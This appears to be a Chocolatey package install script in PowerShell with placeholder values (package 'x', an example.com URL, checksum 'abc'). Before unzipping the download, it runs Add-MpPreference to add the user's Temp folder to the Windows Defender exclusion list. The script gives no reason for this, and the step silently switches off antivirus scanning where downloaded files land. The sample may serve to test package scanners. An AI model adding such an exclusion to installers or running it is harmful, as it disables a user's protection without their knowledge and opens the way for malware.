$toolsDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
Install-ChocolateyZipPackage -PackageName 'x' -Url 'https://example.com/x.zip' -UnzipLocation $toolsDir -Checksum 'abc' -ChecksumType 'sha256'
